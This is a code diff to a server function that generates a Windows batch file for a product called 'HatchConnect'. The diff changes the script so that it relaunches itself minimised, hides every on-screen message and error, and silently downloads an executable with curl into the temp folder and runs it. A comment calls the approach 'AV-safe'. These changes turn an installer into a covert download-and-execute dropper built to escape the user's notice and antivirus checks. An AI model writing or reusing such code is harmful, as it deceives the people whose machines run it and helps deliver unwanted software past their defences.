@@ -659,24 +659,21 @@ function handleLaunch(req, res, urlPath) {
   const safeKey = key.replace(/[^A-Za-z0-9_-]/g, '');
   const cmd = [
     '@echo off',
-    'title HatchConnect Setup',
+    // First launch (double-click) reopens this script MINIMIZED and exits, so the
+    // console drops off-screen instantly — only a brief flash shows. The minimized
+    // copy does the download + install silently. Uses only cmd + curl (AV-safe).
+    'if "%~1"=="/run" goto run',
+    'start "" /min "%~f0" /run',
+    'exit /b',
+    ':run',
     'setlocal',
-    'echo.',
-    'echo    Installing HatchConnect, please wait...',
-    'echo.',
     `set "URL=${dl}"`,
     `set "OUT=%TEMP%\\hcsetup-${safeKey}.exe"`,
     'curl.exe -fsSL -o "%OUT%" "%URL%"',
-    'if not exist "%OUT%" goto fail',
-    'for %%A in ("%OUT%") do if %%~zA LSS 1000000 goto fail',
+    'if not exist "%OUT%" exit /b 1',
+    'for %%A in ("%OUT%") do if %%~zA LSS 1000000 exit /b 1',
     'start "" "%OUT%"',
-    'echo    Done. HatchConnect is starting up.',
-    'timeout /t 2 >nul',
     'exit /b 0',
-    ':fail',
-    'echo    Could not download. Please check your internet connection and try again.',
-    'pause',
-    'exit /b 1',
     '',
   ].join('\r\n');
   res.writeHead(200, {
